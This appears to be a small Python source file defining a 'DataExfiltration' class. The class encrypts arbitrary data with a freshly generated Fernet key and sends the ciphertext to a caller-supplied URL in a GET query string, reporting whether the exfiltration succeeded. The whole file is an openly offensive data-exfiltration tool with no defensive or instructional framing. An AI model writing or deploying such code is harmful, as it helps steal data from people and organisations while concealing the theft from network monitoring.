import requests
import json
from cryptography.fernet import Fernet

class DataExfiltration:
    def __init__(self):
        # Generate a key for encryption
        self.key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.key)

    def exfiltrate_data(self, url, data):
        encrypted_data = self.encrypt_data(data)
        exfil_url = f"{url}?data={encrypted_data}"
        response = requests.get(exfil_url)
        if response.status_code == 200:
            print(f"Data exfiltrated successfully to: {url}")
        else:
            print(f"Failed to exfiltrate data, Status Code: {response.status_code}")
    
    def encrypt_data(self, data):
        data_bytes = data.encode('utf-8')
        encrypted_data = self.cipher_suite.encrypt(data_bytes)
        return encrypted_data.decode('utf-8')

    def decrypt_data(self, encrypted_data):
        encrypted_bytes = encrypted_data.encode('utf-8')
        decrypted_data = self.cipher_suite.decrypt(encrypted_bytes)
        return decrypted_data.decode('utf-8')
